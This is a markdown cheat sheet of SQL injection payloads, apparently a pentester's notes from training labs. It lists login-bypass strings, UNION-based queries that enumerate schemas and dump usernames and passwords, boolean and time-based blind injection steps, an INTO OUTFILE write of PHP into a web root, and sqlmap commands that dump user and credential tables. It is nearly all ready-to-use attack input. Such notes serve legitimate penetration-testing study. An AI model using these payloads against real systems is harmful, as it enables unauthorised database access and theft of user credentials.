# SQL Injection

**Line Comments Sample SQL Injection Attacks**

- Username: `admin'--`
- Username: `admin' OR 1=1; --`
- Username: `admin' sleep(10);`

`' or 1=1; -- -`

### Enumerating columns in a table

Start by incrementing the ORDER BY value untill you get an error

```
searchitem=test' ORDER BY 3-- -
```

After getting the column information it is time to use union

```
searchitem=test' UNION SELECT 1,2,3-- -
```

If this produces “1,2,3” on the page and we can hijack one of these and replace it with a nested SQL statement like:

```
searchitem=test' UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -

searchitem=test' UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'db'),3-- -

searchitem=test' UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'),3-- -

searchitem=test' UNION SELECT 1,(select username from db.users),3-- -


group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

/admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -

/admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
```

## Blind SQLi Boolean based

```
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2,3;--
admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 where database() like 's%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

cycle trough characters

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

columns

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named id, you'll append that to your original payload (as seen below).

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

Repeating this process three times will enable you to discover the columns id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username which you can use the payload below:

admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

## Blind SQLi Time based

```
admin123' UNION SELECT SLEEP(5);--
If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:
admin123' UNION SELECT SLEEP(5),2;--



referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--

...

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2  from users where username='admin' and password like '4961%
```

## The same but with commands

http://10.10.9.16/item.php?id=5 order by 1,2,3,4,5,6

http://10.10.9.16/item.php?id=5 union all select 1,2,3,4,5

Return the DB name

http://10.10.9.16/item.php?id=5 union all select 1,database(),3,4,5

Return table names

http://10.10.9.16/item.php?id=5 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema = database()

Return columns

http://10.10.9.16/item.php?id=5 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema = database() and table_name = "users"

http://10.10.9.16/item.php?id=5 union select 1,password,3,4,5 from users

## LFI

```
/room.php?cod=999 UNION SELECT "1","2",(SELECT '<?php phpinfo(); ?>'),"4","5","6" INTO OUTFILE '/var/www/html/test.php'

Placeholders are present just to complete the UNION statement
```

## SQL Map

### From Burp/ZAP capture

Capture the request and create a req.txt file

```
sqlmap -r req.txt --current-user

sqlmap -r request.txt --dbms=mysql --dump

sqlmap -r request -p title

-r uses the intercepted request you saved earlier
-p selects the parameter we want to test
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database
```

```
 sqlmap -r search_form.txt --tables
 sqlmap -r search_form.txt --columns -D Staff
 sqlmap -r search_form.txt --columns -D users
 sqlmap -r search_form.txt --dump -D users -T UserDetails
```

### GET Request Injection

```
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id

If vulnerable, list tables
sqlmap -u "http://example.com/?id=*" -p id --tables
sqlmap -u "http://example.com/?id=1" -D awd -T accounts --dump
```

#### Using a cookie

```
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title

List databases
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs

List tables
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables

List columns
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users --columns

Dump table contents
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP --tables -T users -C admin,password,email --dump
```

### POST Request Injection

```
sqlmap -u "http://example.com" --data "username=*&password=*"
```

###

```
sqlmap -u "http://10.10.35.99/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

To dump specific database tables
sqlmap -u "http://10.10.35.99/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] -D joomla --tables

To dump table contents
sqlmap -u "http://10.10.35.99/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --dump
```
